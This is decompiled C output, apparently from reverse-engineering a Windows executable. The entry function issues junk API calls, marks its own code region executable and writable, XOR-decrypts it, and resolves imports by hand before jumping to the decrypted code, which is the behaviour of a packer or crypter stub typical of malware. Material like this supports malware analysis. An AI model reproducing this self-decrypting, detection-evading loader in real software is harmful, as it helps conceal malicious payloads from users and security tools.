// subject.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

// 00401000: Register Eq_2 Win32CrtStartup()
DWORD Win32CrtStartup()
{
	word32 ebx_1061 = AddAce(null, 0x00, 0x00, null, 0x00) + 0x24 + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00);
	Eq_3 ebp_1098 = null;
	if (AreAnyAccessesGranted(~0x00, ~0x00) == 0x00)
		ebx_1061 = ebx_1061 - 0x22;
	CloseHandle((void *) 0x59);
	VirtualProtect(&globals->v401000, 0x3000, 0x40, fp - 0x10);
	struct Eq_680 * eax_1086 = null;
	do
	{
		if (ebp_1098 == ebx_1061)
			ebp_1098 = null;
		eax_1086[0x004014A0] = (struct Eq_680) (eax_1086[0x004014A0] ^ ebp_1098[0x00404000]);
		eax_1086 = eax_1086 + 0x01;
		ebp_1098 = (Eq_3) (ebp_1098 + 0x01);
	} while (eax_1086 < (struct Eq_680 *) 5152);
	uint32 esi_1115 = 0x00;
	struct Eq_704 * edx_1118 = &globals->t402780;
	uint32 dwLoc04_1121 = 0x00;
	do
	{
		Eq_710 eax_1130 = edx_1118->t0004;
		cui16 * ecx_1136 = (char *) &edx_1118->t0004 + 0x04;
		if (eax_1130 - 0x08 >> 0x01 > 0x00)
		{
			uint32 dwLoc08_1303 = eax_1130 - 0x08 >> 0x01;
			do
			{
				if ((*ecx_1136 & 0xF000) == 0x3000)
				{
					struct Eq_732 * eax_1327 = ((word32) *ecx_1136 & 0x0FFF) + edx_1118->dw0000;
					eax_1327->dw401220 = eax_1327->dw401220 + 0xF0401220;
				}
				uint32 v18_1319 = dwLoc08_1303 - 0x01;
				ecx_1136 = ecx_1136 + 0x01;
				dwLoc08_1303 = v18_1319;
			} while (v18_1319 != 0x00);
			esi_1115 = dwLoc04_1121;
		}
		esi_1115 = (word32) edx_1118->t0004 + esi_1115;
		dwLoc04_1121 = esi_1115;
		edx_1118 = edx_1118 + Mem1105[edx_1118 + 0x04:word32];
	} while (esi_1115 < 228);
	struct Eq_759 * esi_1152 = &globals->t401F7C;
	struct Eq_759 * dwLoc04_1153 = &globals->t401F7C;
	esi_1185 = esi_1152;
	if (globals->dw401F8C != 0x00)
	{
		do
		{
			struct Eq_759 * esi_1185;
			Eq_798 eax_1194 = LoadLibraryA(esi_1185->dw000C + 0x00401220);
			if (eax_1194 != null)
			{
				struct Eq_817 * ebp_1220 = esi_1185->dw0000;
				if (ebp_1220 == null)
					ebp_1220 = esi_1185->dw0010;
				Eq_823 eax_1225 = ebp_1220->t401220;
				union Eq_827 * ebp_1227 = &ebp_1220->t401220;
				word32 * ebx_1229 = esi_1185->dw0010 + 0x00401220;
				if (eax_1225 != 0x00)
				{
					do
					{
						Eq_848 eax_1269;
						if (eax_1225 < 0x00)
							eax_1269 = GetProcAddress(eax_1194, (word32) *ebp_1227);
						else
							eax_1269 = GetProcAddress(eax_1194, (word32) eax_1225 + 0x00401222);
						*ebx_1229 = (word32) eax_1269;
						ebp_1227 = (union Eq_827 *) ((char *) ebp_1227 + 0x04);
						eax_1225 = *ebp_1227;
						ebx_1229 = ebx_1229 + 0x01;
					} while (eax_1225 != 0x00);
					esi_1185 = dwLoc04_1153;
				}
			}
			esi_1185 = esi_1185 + 0x01;
			dwLoc04_1153 = esi_1185;
		} while (esi_1185->dw0010 != 0x00);
	}
	ptr32 esp_1163;
	byte SCZO_1164;
	word32 ebx_1165;
	word32 ebp_1166;
	word32 esi_1167;
	word32 edi_1168;
	byte SZO_1169;
	byte C_1170;
	word32 edx_1171;
	word32 eax_1172;
	byte Z_1173;
	byte cl_1174;
	word32 ecx_1175;
	word16 ax_1176;
	byte S_1177;
	globals->t401C70();
	*(esp_1163 - 0x04) = 0x00;
	ExitProcess(*(esp_1163 - 0x04));
}

